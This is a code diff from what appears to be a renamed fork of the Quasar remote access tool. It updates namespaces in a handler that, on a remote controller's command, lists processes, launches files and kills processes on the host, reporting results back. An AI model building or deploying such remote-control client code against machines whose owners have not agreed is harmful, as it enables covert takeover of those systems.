@@ -1,10 +1,11 @@
 ﻿using Everything.Networking;
 using Everything.Setup;
-using Quasar.Common;
-using Quasar.Common.Enums;
-using Quasar.Common.Helpers;
-using Quasar.Common.Messages;
-using Quasar.Common.Networking;
+using Q3C273.Shared;
+using Q3C273.Shared.Enums;
+using Q3C273.Shared.Helpers;
+using Q3C273.Shared.Messages;
+using Q3C273.Shared.Models;
+using Q3C273.Shared.Networking;
 using System;
 using System.ComponentModel;
 using System.Diagnostics;
@@ -63,12 +64,12 @@ namespace Everything.MessageHandlers
 
         private void Execute(ISender client, GetProcesses message)
         {
-            var pList = Process.GetProcesses();
-            var processes = new Quasar.Common.Models.Process[pList.Length];
+            var pList = System.Diagnostics.Process.GetProcesses();
+            var processes = new Q3C273.Shared.Models.Process[pList.Length];
 
             for (var i = 0; i < pList.Length; i++)
             {
-                var process = new Quasar.Common.Models.Process
+                var process = new Q3C273.Shared.Models.Process
                 {
                     Name = pList[i].ProcessName + ".exe",
                     Id = pList[i].Id,
@@ -157,7 +158,7 @@ namespace Everything.MessageHandlers
                         UseShellExecute = true,
                         FileName = filePath
                     };
-                    Process.Start(startInfo);
+                    System.Diagnostics.Process.Start(startInfo);
                     _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                 }
                 catch (Exception)
@@ -172,7 +173,7 @@ namespace Everything.MessageHandlers
         {
             try
             {
-                Process.GetProcessById(message.Pid).Kill();
+                System.Diagnostics.Process.GetProcessById(message.Pid).Kill();
                 client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = true });
             }
             catch
